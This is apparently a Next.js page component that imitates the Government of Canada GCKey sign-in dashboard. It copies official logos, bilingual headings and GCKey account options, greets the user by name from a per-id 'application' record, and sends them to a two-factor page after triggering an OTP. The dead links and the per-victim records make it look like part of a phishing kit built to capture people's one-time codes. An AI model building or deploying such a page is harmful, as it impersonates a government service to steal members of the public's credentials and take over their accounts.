"use client";

import { useRouter } from "next/navigation";
import { use, useTransition, useEffect, useState } from "react";
import { sendOtpAction } from "@/actions/authActions";
import { fetchApplicationByIdAction } from "@/actions/applicationActions";

export default function DashboardPage({
  params,
}: {
  params: Promise<{ id: string }>;
}) {
  const { id } = use(params);
  const router = useRouter();
  const [isPending, startTransition] = useTransition();
  const [applicationData, setApplicationData] = useState<any>(null);

  // Fetch application data dynamically
  useEffect(() => {
    async function fetchData() {
      const res = await fetchApplicationByIdAction(id);
      if (res.data) setApplicationData(res.data);
    }
    fetchData();
  }, [id]);

  const handleClick = async () => {
    startTransition(async () => {
      try {
        const res = await sendOtpAction(id);
        if (res.error) {
          alert(res.error.message?.[0] ?? "Failed to send OTP");
          return;
        }
        router.push(`/twofactor/${id}`);
      } catch (err) {
        console.error(err);
        alert("Something went wrong.");
      }
    });
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Header */}
      <header className="bg-white border-b w-full">
        <div className="w-full flex items-center justify-between px-8 py-5 max-w-none">
          {/* Logo + Gov Text */}
          <div className="flex items-center space-x-6">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/d/d9/Flag_of_Canada_%28Pantone%29.svg"
              alt="Canadian Flag"
              className="w-20 h-20"
            />
            <div className="leading-tight">
              <p className="text-lg font-bold">Government</p>
              <p className="text-lg font-bold">of Canada</p>
            </div>
            <div className="ml-6 border-l h-8 border-gray-300"></div>
            <div className="leading-tight">
              <p className="text-lg font-bold">Gouvernement</p>
              <p className="text-lg font-bold">du Canada</p>
            </div>
          </div>

          {/* Language */}
          <a
            href="#"
            className="text-base text-blue-900 hover:underline font-medium"
          >
            Français
          </a>
        </div>

        {/* Navigation */}
        <nav className="w-screen bg-[#2f4b72] text-white text-sm border-t border-b border-white/20">
          <div className="grid grid-cols-[40px_1fr_1fr_1fr_40px] w-screen">
            <div className="border-r border-white/20"></div>
            <div className="flex items-center justify-center border-r border-white/20 py-3">
              <a href="#" className="hover:underline text-[16px]">
                Definitions
              </a>
            </div>
            <div className="flex items-center justify-center border-r border-white/20 py-3">
              <a href="#" className="hover:underline text-[16px]">
                FAQ
              </a>
            </div>
            <div className="flex items-center justify-center border-r border-white/20 py-3">
              <a href="#" className="hover:underline text-[16px]">
                Help
              </a>
            </div>
            <div></div>
          </div>
        </nav>
      </header>

      {/* Breadcrumb */}
      <div className="w-full max-w-[1400px] mx-auto px-8 pt-6 text-left">
        <p className="text-sm text-gray-700 mb-2">
          Home ➜{" "}
          <span className="text-blue-800">
            {applicationData?.userName ?? "Loading..."}
          </span>
        </p>
      </div>

      {/* Main Content */}
      <main className="w-full max-w-[1400px] mx-auto px-8 py-10">
        <div className="flex flex-col md:flex-row gap-8">
          {/* Main Content Box */}
          <div className="flex-1 p-2 order-1 md:order-1">
            <div className="border-b-2 border-red-700 mb-4">
              <h1 className="text-3xl font-bold text-gray-900 mb-4">
                Welcome {applicationData?.userName ?? "Loading..."}
              </h1>
            </div>
            <div className="px-6 py-8 text-[17px] text-gray-800 space-y-5">
              <p>
                You last signed in with your GCKey on{" "}
                {applicationData?.updatedAt
                  ? (() => {
                    const date = new Date(applicationData.updatedAt);
                    return date
                      .toLocaleString("en-US", {
                        weekday: "long",
                        year: "numeric",
                        month: "long",
                        day: "2-digit",
                        hour: "2-digit",
                        minute: "2-digit",
                        second: "2-digit",
                        hour12: false,
                        timeZone: "America/New_York", // Eastern Time
                      })
                      .replace(/^(\w+)/, "$1,") // add comma after weekday
                      .replace(",", "") // cleanup unnecessary comma
                      .replace(/(\d{4})/, "$1 at"); // insert 'at' after year
                  })() + " ET."
                  : "Loading..."}
              </p>
              <p>
                From this page you can{" "}
                <a href="#" className="text-blue-800 underline hover:text-blue-900">
                  Change Your Password
                </a>
                ,{" "}
                <a href="#" className="text-blue-800 underline hover:text-blue-900">
                  Change Your Recovery Questions
                </a>
                ,{" "}
                <a href="#" className="text-blue-800 underline hover:text-blue-900">
                  Manage Your Email Address
                </a>{" "}
                or{" "}
                <a href="#" className="text-blue-800 underline hover:text-blue-900">
                  Revoke Your GCKey
                </a>
                .
              </p>

              <p>
                To help protect your information, please remember to sign out and close your
                browser before leaving this computer unattended.
              </p>

              <p>
                Please select <strong>Continue</strong> to proceed to two-factor authentication.
              </p>




            </div>
            <div className="pt-4 flex justify-center">
              <button
                onClick={handleClick}
                disabled={isPending}
                className="bg-[#2f4b72] text-white px-8 py-2 rounded hover:bg-[#1f3555] disabled:opacity-50"
              >
                {isPending ? "Sending OTP..." : "Continue"}
              </button>
            </div>
          </div>

          {/* Sidebar */}
          <aside className="w-full md:w-1/4 bg-white rounded-lg shadow-sm p-6 h-fit order-2 md:order-2">
            <h2 className="font-bold text-lg mb-4">Options</h2>
            <ul className="space-y-1">
              {[
                "Change Your Password",
                "Change Your Recovery Questions",
                "Manage Your Email Address",
                "Revoke Your GCKey",
                "Sign Out",
              ].map((item) => (
                <li key={item}>
                  <a
                    href="#"
                    className="block text-gray-600 px-3 py-2 rounded hover:bg-gray-100"
                  >
                    {item}
                  </a>
                </li>
              ))}
            </ul>
          </aside>
        </div>
      </main>

      {/* Footer */}
      <footer className="mt-16">
        <div className="bg-white px-8 py-4 text-md text-gray-900 w-full">
          Date modified:{" "}
          {applicationData?.updatedAt
            ? new Date(applicationData.updatedAt).toISOString().split("T")[0]
            : "Loading..."}
        </div>

        <div className="bg-[#e9ecef] w-full">
          <div className="w-full px-8 py-10 grid grid-cols-1 md:grid-cols-3 gap-12 text-sm text-gray-900">
            <div>
              <h4 className="font-bold text-lg mb-4">About</h4>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    About GCKey
                  </a>
                </li>
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    Enabled Services
                  </a>
                </li>
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    Site Map
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-lg mb-4">Transparency</h4>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    Proactive Disclosure
                  </a>
                </li>
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    Terms and Conditions
                  </a>
                </li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold text-lg mb-4">Contact Us</h4>
              <ul className="space-y-3">
                <li>
                  <a href="#" className="text-blue-800 hover:underline">
                    Phone Numbers
                  </a>
                </li>
              </ul>
            </div>
          </div>
          <div className="h-[4px] bg-[#2f4b72] w-full"></div>
        </div>
        <div className="bg-white py-6 px-8 flex justify-end w-full">
          <img
            src="https://www.canada.ca/etc/designs/canada/cdts/gcweb/v4_0_43/wet-boew/assets/wmms-blk.svg"
            alt="Canada logo"
            className="h-8"
          />
        </div>
      </footer>
    </div>
  );
}
